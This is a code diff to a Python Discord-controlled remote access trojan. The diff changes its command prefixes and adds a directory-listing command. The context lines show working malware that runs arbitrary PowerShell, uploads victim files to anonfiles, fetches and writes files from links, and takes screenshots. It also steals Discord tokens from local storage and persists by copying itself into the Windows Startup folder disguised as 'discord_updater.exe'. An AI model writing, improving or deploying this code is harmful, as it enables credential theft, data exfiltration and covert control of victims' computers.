@@ -36,20 +36,21 @@ session_id = os.urandom(8).hex()
 token = config["token"]
 guild_id = config["guild_id"]
 commands = "\n".join([
-    "!help - Help command",
-    "!ping - Ping command",
-    "!cd - Change directory",
-    "!ls - List directory",
-    "!download <file> - Download file",
-    "!upload <link> - Upload file",
-    "!shell - Execute shell command",
-    "!run <file> - Run an file",
-    "!exit - Exit the session",
-    "!screenshot - Take a screenshot",
-    "!tokens - Get all discord tokens",
-    "!startup - Add to startup",
-    "!shutdown - Shutdown the computer",
-    "!restart - Restart the computer",
+    "help - Help command",
+    "ping - Ping command",
+    "cwd - Get current working directory",
+    "cd - Change directory",
+    "ls - List directory",
+    "download <file> - Download file",
+    "upload <link> - Upload file",
+    "shell - Execute shell command",
+    "run <file> - Run an file",
+    "exit - Exit the session",
+    "screenshot - Take a screenshot",
+    "tokens - Get all discord tokens",
+    "startup - Add to startup",
+    "shutdown - Shutdown the computer",
+    "restart - Restart the computer",
 ])
 
 @bot.event
@@ -78,15 +79,15 @@ async def on_message(message):
     if message.channel.name != session_id:
         return
 
-    if message.content == "!help":
+    if message.content == "help":
         embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "!ping":
+    if message.content == "ping":
         embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("!cd"):
+    if message.content.startswith("cd"):
         directory = message.content.split(" ")[1]
         try:
             os.chdir(directory)
@@ -95,14 +96,14 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "!ls":
+    if message.content == "ls":
         files = "\n".join(os.listdir())
         if files == "":
             files = "No files found"
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("!download"):
+    if message.content.startswith("download"):
         file = message.content.split(" ")[1]
         try:
             link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
@@ -112,7 +113,7 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
             await message.reply(embed=embed)
 
-    if message.content.startswith("!upload"):
+    if message.content.startswith("upload"):
         link = message.content.split(" ")[1]
         file = requests.get(link).content
         with open(os.path.basename(link), "wb") as f:
@@ -120,7 +121,7 @@ async def on_message(message):
         embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("!shell"):
+    if message.content.startswith("shell"):
         command = message.content.split(" ")[1]
         output = subprocess.Popen(
             ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
@@ -130,17 +131,17 @@ async def on_message(message):
         embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("!run"):
+    if message.content.startswith("run"):
         file = message.content.split(" ")[1]
         subprocess.Popen(file, shell=True)
         embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "!exit":
+    if message.content == "exit":
         await message.channel.delete()
         await bot.close()
 
-    if message.content == "!screenshot":
+    if message.content == "screenshot":
         screenshot = pyautogui.screenshot()
         path = os.path.join(os.getenv("TEMP"), "screenshot.png")
         screenshot.save(path)
@@ -149,7 +150,7 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
-    if message.content == "!tokens":
+    if message.content == "tokens":
         paths = [
             os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
             os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
@@ -182,7 +183,7 @@ async def on_message(message):
         embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "!startup":
+    if message.content == "startup":
         path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         try:
             shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
@@ -191,13 +192,17 @@ async def on_message(message):
         except:
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
             await message.reply(embed=embed)
+            
+    if message.content == "cwd":
+        embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
+        await message.reply(embed=embed)
 
-    if message.content == "!shutdown":
+    if message.content == "shutdown":
         await message.channel.delete()
         await bot.close()
         os.system("shutdown /s /t 0")
 
-    if message.content == "!restart":
+    if message.content == "restart":
         await message.channel.delete()
         await bot.close()
         os.system("shutdown /r /t 0")
